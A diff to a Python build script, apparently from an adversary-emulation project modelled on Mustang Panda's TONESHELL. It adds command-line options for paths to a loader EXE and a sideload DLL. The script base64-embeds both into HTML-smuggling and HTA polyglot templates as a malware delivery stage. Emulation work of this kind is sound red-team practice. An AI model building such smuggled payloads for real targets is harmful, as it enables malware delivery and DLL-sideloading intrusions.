@@ -24,18 +24,20 @@ Steps:
 
 Usage:
     python build.py
+    python build.py --exe path\\to\\EssosUpdate.exe --dll path\\to\\wsdapi.dll
 """
 
+import argparse
 import base64
 import os
 import textwrap
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-TONESHELL = os.path.normpath(os.path.join(
+DEFAULT_TONESHELL = os.path.normpath(os.path.join(
     HERE, "..", "..", "rce-and-c2", "mustang-panda-emulation", "toneshell-v2"))
 
-EXE_PATH = os.path.join(TONESHELL, "EssosUpdate.exe")
-DLL_PATH = os.path.join(TONESHELL, "build", "src", "wsdapi", "Release", "wsdapi.dll")
+DEFAULT_EXE_PATH = os.path.join(DEFAULT_TONESHELL, "EssosUpdate.exe")
+DEFAULT_DLL_PATH = os.path.join(DEFAULT_TONESHELL, "build", "src", "wsdapi", "Release", "wsdapi.dll")
 
 HTA_TPL  = os.path.join(HERE, "stage1.tpl.hta")
 HTML_TPL = os.path.join(HERE, "staging.tpl.html")
@@ -95,13 +97,27 @@ def build_polyglot(hta_bytes):
     )
 
 
+def parse_args():
+    ap = argparse.ArgumentParser(
+        description="Build the HTML-smuggling -> polyglot -> HTA delivery variant (Step 1C).")
+    ap.add_argument("--exe", default=DEFAULT_EXE_PATH,
+                    help="loader binary to embed (default: toneshell-v2 EssosUpdate.exe)")
+    ap.add_argument("--dll", default=DEFAULT_DLL_PATH,
+                    help="sideload DLL to embed (default: wsdapi Release build)")
+    return ap.parse_args()
+
+
 def main():
-    for p in (EXE_PATH, DLL_PATH):
+    args = parse_args()
+    exe_path = os.path.abspath(args.exe)
+    dll_path = os.path.abspath(args.dll)
+
+    for p in (exe_path, dll_path):
         if not os.path.exists(p):
             raise SystemExit(f"[!] missing input: {p}")
 
-    exe_b64 = b64_of(EXE_PATH)
-    dll_b64 = b64_of(DLL_PATH)
+    exe_b64 = b64_of(exe_path)
+    dll_b64 = b64_of(dll_path)
 
     with open(HTA_TPL, "r", encoding="utf-8") as f:
         hta = f.read()
